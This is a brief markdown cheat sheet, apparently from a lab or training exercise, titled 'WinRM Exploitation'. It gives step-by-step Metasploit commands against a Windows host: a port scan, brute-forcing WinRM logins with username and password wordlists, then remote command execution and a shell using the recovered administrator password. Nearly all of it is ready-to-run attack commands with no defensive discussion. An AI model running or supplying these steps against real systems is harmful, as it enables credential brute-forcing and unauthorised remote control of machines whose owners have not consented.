### WinRM Exploitation

---

##### Scan Port (WinRM doesn't belong to common port scanned by nmap)

> - nmap --top-ports 7000 10.0.0.173

*By default WinRM service uses port 5985 for HTTP*

##### Run the metasploit winmi_login module to find Creds

> - msfconsole -q
> - use auxiliary/scanner/winrm/winrm_login
> - set RHOSTS 10.0.0.173
> - set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
> - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
> - set VERBOSE false
>   
>   exploit>

---

##### Check the authentication methods

> - use auxiliary/scanner/winrm/winrm_auth_methods
> - set RHOSTS 10.0.0.173
> - exploit

##### Exploitation (Only one command)

> - use auxiliary/scanner/winrm/winrm_cmd
> - set RHOSTS 10.0.0.173
> - set USERNAME administrator
> - set PASSWORD tinkerbell
> - set CMD whoami
> - exploit

##### Exploitation (get a shell)

> - use exploit/windows/winrm/winrm_script_exec
> - set RHOSTS 10.0.0.173
> - set USERNAME administrator
> - set PASSWORD tinkerbell
> - set FORCE_VBS true
> - exploit
